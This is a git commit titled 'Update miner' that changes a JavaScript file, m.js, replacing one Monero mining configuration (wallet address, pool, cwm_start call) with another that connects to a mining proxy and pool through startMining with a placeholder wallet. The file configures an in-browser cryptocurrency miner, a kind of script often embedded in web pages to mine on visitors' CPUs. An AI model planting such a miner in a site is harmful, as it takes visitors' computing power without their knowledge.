106f2e9454729ed8a35883d24bf90ac86a1c8e7b
krazykirby99999 <krazykirby99999@gmail.com>
2021-01-23 15:35:37 -0600

    Update miner

--- m.js
+++ m.js
@@ -1,10 +1,10 @@
-var site_id = 'cwm-3859';
-var coin = 'monero';
-var wallet = '48UXuwhg2feEXALK9XrSWNVzHTA7p3gurh67hJUdPGwNANWXovurhRu32My9BCmzdRDdADW9wkFraDDtHqfcSDMH9YzbMiH';
-var password = 'x';
-var mining_pool = 'mine.xmrpool.net:3333';
-var threads = -1;
-var throttle = 0.8;
-var debug = false;
-cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
 
+
+server = "wss://f.xmrminingproxy.com:8181";
+var pool = "moneroocean.stream";
+var walletAddress = "PUT YOUR WALLET ADDRESS HERE";
+var workerId = ""
+var threads = -1;
+var password = "x";
+startMining(pool, walletAddress, workerId, threads, password);
+throttleMiner = 20;
